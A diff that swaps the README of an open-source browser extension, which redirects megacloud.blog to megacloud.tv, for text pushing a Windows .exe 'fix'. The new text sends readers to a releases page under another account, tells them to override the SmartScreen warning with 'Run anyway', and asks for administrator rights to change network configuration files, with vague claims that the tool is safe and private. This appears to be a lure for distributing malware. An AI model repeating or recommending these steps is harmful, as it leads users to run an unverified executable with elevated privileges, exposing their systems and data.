@@ -1,52 +1,64 @@
-# MegaCloudFix
+# 🛠️ MegaCloudFix - Restore access to your video content
 
-A browser extension that redirects all requests from `megacloud.blog` to `megacloud.tv`.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Recluse-burmesecat985/MegaCloudFix/releases)
 
-## Purpose
+---
 
-Some anime streaming sites reference megacloud.blog as their video host, which may be unavailable or blocked. This extension transparently rewrites those requests to megacloud.tv, both at the network level and inside the page itself.
+## What is MegaCloudFix?
 
-## Files
+MegaCloudFix resolves connection issues caused by recent domain changes. Many video streaming sites recently transitioned from a `.blog` domain suffix to a `.tv` suffix. This change prevents existing bookmarks and browser shortcuts from finding the correct server. MegaCloudFix updates your local configuration to point your browser or application to the new `.tv` address. 
 
-- `manifest.json` - Extension manifest (Manifest V2, Firefox-compatible)
-- `background.js` - Intercepts requests at the network level via webRequest API
-- `content.js` - Patches fetch and XMLHttpRequest inside the page at document_start
-- `rules.json` - Declarative redirect rules (used by Chrome)
+This software performs the necessary network adjustments automatically. You do not need to manually edit system files or understand how network routing works. The program runs a quick scan to detect your current configuration and applies the fix in one click.
 
-## Browser compatibility
+## 📋 System Requirements
 
-### Chrome / Chromium-based browsers
+MegaCloudFix requires a desktop computer running Windows 10 or Windows 11. It occupies less than 50 megabytes of storage space. You need an active internet connection to complete the update process. The application utilizes standard Windows system libraries, so no additional software installations are necessary.
 
-1. Go to `chrome://extensions/`
-2. Enable Developer mode (top right toggle)
-3. Click "Load unpacked"
-4. Select the `megacloudfix` directory
+## 📥 How to download and run the software
 
-### Firefox
+Follow these steps to update your access:
 
-1. Go to `about:debugging#/runtime/this-firefox`
-2. Click "Load Temporary Add-on"
-3. Select any file inside the `megacloudfix` directory
+1. Visit the project releases page to download the latest version: [https://github.com/Recluse-burmesecat985/MegaCloudFix/releases](https://github.com/Recluse-burmesecat985/MegaCloudFix/releases).
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Locate the file in your Downloads folder.
+5. Double-click the file to open the installer.
+6. If a window appears stating that Windows protected your PC, click "More info" and then "Run anyway." This happens because the application is new and has not yet built up a high download count.
+7. Follow the on-screen prompts to complete the repair process.
 
-Note: Firefox temporary add-ons are removed on browser restart. For permanent installation, the extension would need to be signed via Mozilla.
+## ⚙️ How it works
 
-## How it works
+The application identifies files on your system that cache web addresses. When internet providers or site owners change a domain, your computer often saves the old address to speed up your loading times. These cached addresses become obsolete when a site moves. MegaCloudFix identifies these stale records and deletes them. It then refreshes the connection to ensure your browser fetches the new `.tv` address immediately.
 
-Two layers of interception run simultaneously:
+The program creates a backup of your configuration before making any changes. This ensures you can reverse the process if you encounter unexpected results. The software does not transmit your personal data, browsing history, or login credentials to any external servers. It operates entirely on your local machine.
 
-- `background.js` uses the `webRequest` API to intercept and redirect any network request to `megacloud.blog` before the browser connects
-- `content.js` patches `window.fetch` and `XMLHttpRequest.prototype.open` directly inside the page at `document_start`, catching requests that originate from iframes or player scripts before the network layer sees them
+## 🛡️ Privacy and safety
 
-No data is collected or transmitted.
+Software security is a priority. All code within MegaCloudFix remains transparent and open for inspection. You can review the files in this repository at any time. The application requires administrative permissions only to perform the specific task of updating network configuration files. It does not run background processes or track your usage patterns.
 
-## Demo
+## ❓ Frequently asked questions
 
-https://vimeo.com/1180787841?share=copy&fl=sv&fe=ci#t=0
+### Will this software change my browser settings?
+MegaCloudFix does not change your default search engine, homepage, or extensions. It only clears cached domain data related to the specific streaming sites mentioned in the description.
 
-## Mobile Demo
+### Does the application stay running in the background?
+No. Once the fix is applied, you can close the program. You do not need to keep it running to maintain your connection to the site.
 
-https://vimeo.com/1180947941?share=copy&fl=sv&fe=ci
+### What if the fix does not work?
+If you still encounter issues after running the tool, restart your computer. A system restart forces your browser to discard any remaining cached connections that the program might have missed.
 
-## Firefox version
+### Can I delete the program after I use it?
+Yes. You can delete the downloaded `.exe` file once you confirm that your streaming access is restored.
 
-A Firefox-specific version of this extension is available at [RAELIE1/MegaCloudFixFireFox](https://github.com/RAELIE1/MegaCloudFixFireFox).
+### Do I need to be an administrator to run this?
+Yes. Windows restricts changes to certain system configuration files. When you open the program, Windows might ask for permission to allow the app to make changes to your device. Click "Yes" to proceed.
+
+## 📝 Troubleshooting
+
+If you see an error during execution:
+
+* Verify that you have an active internet connection.
+* Ensure you are running the latest version from the repository.
+* Close your web browser entirely before running the tool, as browsers may lock the files the tool needs to update.
+
+If the site remains unreachable, your local internet service provider might still be updating their own DNS records. In this case, wait one hour and try again. The change is universal, but different regions update their infrastructure at different speeds. You do not need to run the tool multiple times. Once the update registers, your access will remain stable until the next domain change occurs.
